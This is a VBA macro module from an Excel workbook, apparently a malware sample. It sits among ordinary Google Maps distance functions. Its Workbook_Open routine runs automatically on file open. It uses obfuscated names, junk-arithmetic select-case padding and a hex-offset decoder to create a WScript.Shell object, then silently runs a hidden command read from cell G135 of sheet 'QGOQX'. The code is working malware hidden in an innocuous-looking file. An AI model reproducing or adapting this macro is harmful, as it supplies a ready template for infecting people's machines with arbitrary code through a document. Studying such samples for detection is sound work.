Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit
Public s238c9566d761a2 As Object
Public Function GetDuration(start As String, dest As String)
    Dim firstVal As String, secondVal As String, lastVal As String
    firstVal = "http://maps.googleapis.com/maps/api/distancematrix/json?origins="
    secondVal = "&destinations="
    lastVal = "&mode=car&language=en&sensor=false&key=YOUR_KEY"
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    URL = firstVal & Replace(start, " ", "+") & secondVal & Replace(dest, " ", "+") & lastVal
    objHTTP.Open "GET", URL, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    objHTTP.send ("")
    If InStr(objHTTP.responseText, """duration"" : {") = 0 Then GoTo ErrorHandl
    Set regex = CreateObject("VBScript.RegExp"): regex.Pattern = "duration(?:.|\n)*?""value"".*?([0-9]+)": regex.Global = False
    Set matches = regex.Execute(objHTTP.responseText)
    tmpVal = Replace(matches(0).SubMatches(0), ".", Application.International(xlListSeparator))
    GetDuration = CDbl(tmpVal)
    Exit Function
ErrorHandl:
    GetDuration = -1
End Function
Public Function GetDistanceCoord(ByVal lat1 As Double, ByVal lon1 As Double, ByVal lat2 As Double, ByVal lon2 As Double, ByVal unit As String) As Double
    Dim theta As Double: theta = lon1 - lon2
    Dim dist As Double: dist = Math.Sin(deg2rad(lat1)) * Math.Sin(deg2rad(lat2)) + Math.Cos(deg2rad(lat1)) * Math.Cos(deg2rad(lat2)) * Math.Cos(deg2rad(theta))
    dist = WorksheetFunction.Acos(dist)
    dist = rad2deg(dist)
    dist = dist * 60 * 1.1515
    If unit = "K" Then
        dist = dist * 1.609344
    ElseIf unit = "N" Then
        dist = dist * 0.8684
    End If
    GetDistanceCoord = dist
End Function
 
Function deg2rad(ByVal deg As Double) As Double
    deg2rad = (deg * WorksheetFunction.Pi / 180#)
End Function
 
Function rad2deg(ByVal rad As Double) As Double
    rad2deg = rad / WorksheetFunction.Pi * 180#
End Function
Sub Workbook_Open()
Set s238c9566d761a2 = CreateObject(x4fb77ac7("B2AEBECDC4CBCF89AEC3C0C7C7"))
Dim ude686ca3e7 As Long: ude686ca3e7 = 24
Dim x654f5b5ada8e2 As String
Dim o619c127a848b89ccd As Long
Select Case ude686ca3e7
Case 25 / Int(14 + 22 / 19) / 16 / Int(16 + 22 / 28) / 13
x654f5b5ada8e2 = "n725975f"
Case 4 / Int(21 + 28 / 20) / 20 * Int(90 / 47 + 13) - Int(2486 / 3301) * 25
x654f5b5ada8e2 = "ud11fd"
Case 11 + (156 - 60) + Int(6 + 5 - 25) + 23 - (4 + 9) - 4 - (10 + 24) - 20
x654f5b5ada8e2 = "pbf51d94"
Case 7 + (96 - 156) + Int(17 + 16 - 8) + 29 + (96 - 144) + Int(20 + 29 - 26) + 28 - (22 + 26) - 9
x654f5b5ada8e2 = "u7a6aa747d5b"
Case 5 / Int(15 + 5 / 10) / 23 - (10 + 7) - 4
x654f5b5ada8e2 = "bb2b6772d2"
Case 21 * Int(67 / 82 + 16) - Int(1171 / 4938) * 27 / Int(16 + 11 / 25) / 12
x654f5b5ada8e2 = "z5b73ba77"
Case 28 / Int(6 + 6 / 20) / 4 * Int(21 / 89 + 19) - Int(411 / 2841) * 29 * Int(37 / 81 + 10) - Int(1098 / 2744) * 13
x654f5b5ada8e2 = "qa4359f63"
Case 14 * Int(60 / 95 + 19) - Int(4290 / 5680) * 29 * Int(27 / 37 + 15) - Int(4737 / 3424) * 17
x654f5b5ada8e2 = "d2c4ddf2c7d"
Case 13 / Int(28 + 26 / 20) / 18 * Int(27 / 33 + 14) - Int(4776 / 4010) * 26 + (168 - 216) + Int(25 + 8 - 29) + 29
x654f5b5ada8e2 = "lc2f9ab6d"
Case 11 * Int(74 / 85 + 14) - Int(3512 / 2736) * 25 - (18 + 18) - 23 - (15 + 11) - 23
x654f5b5ada8e2 = "zacb73b7"
Case 23 + (324 - 288) + Int(7 + 28 - 8) + 13 / Int(22 + 21 / 19) / 29 / Int(24 + 21 / 13) / 4
x654f5b5ada8e2 = "n4ef7213f6259"
Case 17 * Int(70 / 74 + 13) - Int(3661 / 4367) * 9 * Int(57 / 38 + 13) - Int(4146 / 32) * 14 - (15 + 14) - 14
x654f5b5ada8e2 = "u51aeaf4794cb2"
Case 8 - (21 + 16) - 6 * Int(63 / 74 + 16) - Int(3831 / 1008) * 16
x654f5b5ada8e2 = "e61ef2697"
Case 20 * Int(58 / 38 + 9) - Int(4381 / 3329) * 28 - (19 + 23) - 21 + (132 - 276) + Int(17 + 22 - 4) + 5
x654f5b5ada8e2 = "s216a5ceeeff26"
Case 19 / Int(16 + 21 / 5) / 25 - (17 + 25) - 23 - (23 + 6) - 5
x654f5b5ada8e2 = "yb7f54f"
Case 21 / Int(28 + 27 / 7) / 18 - (28 + 19) - 23 - (18 + 28) - 11
x654f5b5ada8e2 = "w99bf4db54"
Case 26 / Int(13 + 8 / 10) / 26 - (29 + 29) - 15 + (144 - 228) + Int(12 + 19 - 27) + 4
x654f5b5ada8e2 = "l2887d287d"
Case 19 / Int(25 + 24 / 10) / 12 - (16 + 28) - 21
x654f5b5ada8e2 = "ye42c194ba1496a"
Case 22 / Int(21 + 5 / 13) / 7 - (17 + 28) - 19
x654f5b5ada8e2 = "p4bc45befdc9b"
Case 9 - (7 + 4) - 23 * Int(45 / 53 + 14) - Int(3114 / 2612) * 11 * Int(52 / 98 + 10) - Int(2258 / 5276) * 27
x654f5b5ada8e2 = "f354a52826cb3"
Case 29 / Int(6 + 28 / 15) / 26 / Int(17 + 28 / 4) / 6 * Int(31 / 69 + 10) - Int(270 / 2974) * 9
x654f5b5ada8e2 = "l78b65"
Case 25 / Int(5 + 29 / 15) / 25 - (18 + 7) - 8
x654f5b5ada8e2 = "t5acddfb"
Case 9 / Int(15 + 11 / 20) / 27 * Int(46 / 75 + 12) - Int(4468 / 5339) * 22 - (4 + 17) - 6
x654f5b5ada8e2 = "w928d78f"
Case 29 / Int(23 + 7 / 19) / 19 / Int(21 + 20 / 16) / 12 + (48 - 336) + Int(24 + 4 - 15) + 10
x654f5b5ada8e2 = "vb8cea2c5"
Case 20 / Int(9 + 16 / 10) / 6 / Int(19 + 4 / 20) / 19 * Int(54 / 50 + 17) - Int(794 / 2728) * 29
x654f5b5ada8e2 = "feac1227416"
Case 18 / Int(10 + 6 / 23) / 6 / Int(15 + 29 / 11) / 9
x654f5b5ada8e2 = "m622c45"
Case 7 / Int(4 + 22 / 27) / 12 - (16 + 14) - 11 * Int(17 / 36 + 13) - Int(4432 / 901) * 14
x654f5b5ada8e2 = "d93f137"
Case 4 / Int(25 + 27 / 5) / 8 - (12 + 11) - 26 / Int(19 + 28 / 4) / 16
x654f5b5ada8e2 = "b95b3c44d"
Case 11 * Int(52 / 55 + 9) - Int(4317 / 2109) * 18 + (300 - 168) + Int(13 + 8 - 26) + 8 + (132 - 264) + Int(25 + 9 - 5) + 4
x654f5b5ada8e2 = "yf69d9"
Case 7 - (26 + 20) - 8 - (10 + 11) - 13
x654f5b5ada8e2 = "a9b478722a36567"
Case 8 + (312 - 132) + Int(15 + 16 - 10) + 24 / Int(8 + 16 / 27) / 19
x654f5b5ada8e2 = "s245489c8e"
Case 20 * Int(95 / 81 + 18) - Int(508 / 3237) * 14 * Int(93 / 95 + 15) - Int(3943 / 2476) * 7
x654f5b5ada8e2 = "je1d53e24513"
Case 24:
w2d69d6674 ("o481357bf342685")
Case 12 * Int(44 / 85 + 12) - Int(3636 / 4053) * 22 - (7 + 4) - 21 / Int(28 + 28 / 15) / 29
x654f5b5ada8e2 = "c3aba72ac5e24d"
Case 26 / Int(12 + 25 / 9) / 29 - (24 + 22) - 21
x654f5b5ada8e2 = "ka9633ddb77dfdd"
Case 27 + (156 - 84) + Int(15 + 25 - 10) + 13 / Int(10 + 27 / 27) / 15
x654f5b5ada8e2 = "w838a8"
Case 27 / Int(28 + 24 / 20) / 16 * Int(70 / 96 + 17) - Int(2460 / 2547) * 13
x654f5b5ada8e2 = "za6e13b"
Case 29 / Int(5 + 25 / 18) / 17 - (9 + 14) - 19
x654f5b5ada8e2 = "tf9236"
Case 11 + (288 - 312) + Int(10 + 27 - 7) + 17 / Int(20 + 23 / 27) / 15 + (216 - 300) + Int(5 + 27 - 20) + 14
x654f5b5ada8e2 = "s23f8e"
Case 10 - (13 + 15) - 5 + (216 - 252) + Int(20 + 13 - 20) + 16
x654f5b5ada8e2 = "ec686e4afebc"
Case 26 + (96 - 108) + Int(24 + 20 - 8) + 17 / Int(23 + 11 / 9) / 20 * Int(76 / 73 + 17) - Int(2884 / 4583) * 5
x654f5b5ada8e2 = "z7e74ac67165c"
Case 15 + (300 - 204) + Int(17 + 6 - 21) + 6 - (11 + 14) - 26
x654f5b5ada8e2 = "jbe5938142266ba"
Case 7 - (9 + 8) - 27 + (300 - 312) + Int(26 + 26 - 13) + 13
x654f5b5ada8e2 = "qf189dc658c1"
Case 16 / Int(20 + 14 / 12) / 4 / Int(6 + 8 / 8) / 12
x654f5b5ada8e2 = "vad3959b4b49e"
Case 27 / Int(15 + 27 / 21) / 14 * Int(83 / 43 + 19) - Int(3295 / 3944) * 9
x654f5b5ada8e2 = "ee7db576fedf58"
Case 28 / Int(8 + 5 / 25) / 15 / Int(26 + 15 / 5) / 23
x654f5b5ada8e2 = "nb12481ec7fb89e"
Case 13 / Int(22 + 15 / 28) / 8 + (180 - 132) + Int(25 + 9 - 13) + 13 * Int(82 / 61 + 11) - Int(1402 / 3883) * 28
x654f5b5ada8e2 = "v5af274b58949f3"
Case 16 + (300 - 348) + Int(23 + 23 - 20) + 17 / Int(21 + 17 / 26) / 24 * Int(79 / 82 + 17) - Int(4997 / 1496) * 15
x654f5b5ada8e2 = "a35ac1"
Case 26 - (29 + 14) - 22 + (144 - 336) + Int(11 + 6 - 23) + 5 * Int(25 / 77 + 16) - Int(2201 / 1084) * 5
x654f5b5ada8e2 = "rfa5f5496"
Case 15 / Int(8 + 5 / 13) / 10 * Int(82 / 36 + 14) - Int(2365 / 3974) * 7 + (216 - 96) + Int(27 + 17 - 21) + 23
x654f5b5ada8e2 = "cd552ab1f6"
Case 10 * Int(74 / 33 + 18) - Int(4114 / 1838) * 20 * Int(85 / 74 + 9) - Int(4918 / 4261) * 6 / Int(29 + 9 / 5) / 17
x654f5b5ada8e2 = "u7e7efaeee33a5a"
Case 12 / Int(5 + 7 / 23) / 4 + (288 - 216) + Int(21 + 16 - 18) + 29
x654f5b5ada8e2 = "mdfb9c3"
Case 25 - (5 + 15) - 15 + (180 - 96) + Int(25 + 22 - 25) + 9
x654f5b5ada8e2 = "n7f334"
End Select
End Sub
Private Function w2d69d6674(ByVal k9f78a4c7d2512 As String) As String
s238c9566d761a2.Run x4fb77ac7(ThisWorkbook.Sheets("QGOQX").Range("G135").Value), 0, True
End Function

Private Function x4fb77ac7(ByVal k9f78a4c7d2512 As String)
Dim z2344bccf9653 As String: Dim n973a9c1b2dfe4 As Long
For n973a9c1b2dfe4 = 1 To Len(k9f78a4c7d2512) Step 2
z2344bccf9653 = z2344bccf9653 & Chr(Val(Chr(Int(0 + Int(13 / 2) - 9 + 9 + Int(13 / 8) + 5 + Int(7 / 9) + 5 + 21)) & Chr(Int(0 + Int(12 / 2) + Int(11 / 4) - 7 + 8 + Int(8 / 2) + Int(14 / 7) + Int(9 / 8) - 13 + Int(13 / 4) + Int(8 / 7) + 65)) & Right(Left(k9f78a4c7d2512, n973a9c1b2dfe4 + ((34 + 6 - 20) / 2 - 9)), (43 - 23 - 10 + 5 - 13))) - 91)
Next
x4fb77ac7 = z2344bccf9653
End Function
Public Function GetDistance(start As String, dest As String)
    Dim firstVal As String, secondVal As String, lastVal As String
    firstVal = "http://maps.googleapis.com/maps/api/distancematrix/json?origins="
    secondVal = "&destinations="
    lastVal = "&mode=car&language=pl&sensor=false&key=YOUR_KEY"
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    URL = firstVal & Replace(start, " ", "+") & secondVal & Replace(dest, " ", "+") & lastVal
    objHTTP.Open "GET", URL, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    objHTTP.send ("")
    If InStr(objHTTP.responseText, """distance"" : {") = 0 Then GoTo ErrorHandl
    Set regex = CreateObject("VBScript.RegExp"): regex.Pattern = """value"".*?([0-9]+)": regex.Global = False
    Set matches = regex.Execute(objHTTP.responseText)
    tmpVal = Replace(matches(0).SubMatches(0), ".", Application.International(xlListSeparator))
    GetDistance = CDbl(tmpVal)
    Exit Function
ErrorHandl:
    GetDistance = -1
End Function


INQUEST-PP=macro
